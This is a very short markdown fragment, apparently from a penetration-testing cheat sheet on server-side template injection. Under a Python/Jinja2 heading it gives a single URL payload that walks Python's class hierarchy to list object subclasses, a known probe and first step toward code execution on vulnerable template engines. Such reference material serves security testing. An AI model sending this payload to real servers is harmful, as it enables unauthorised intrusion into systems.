# Server-Side Template Injection (SSTI)

## Python
### Jinja2
```
http://[URL]/{{ ''.__class__.__mro__[1].__subclasses__() }}
```
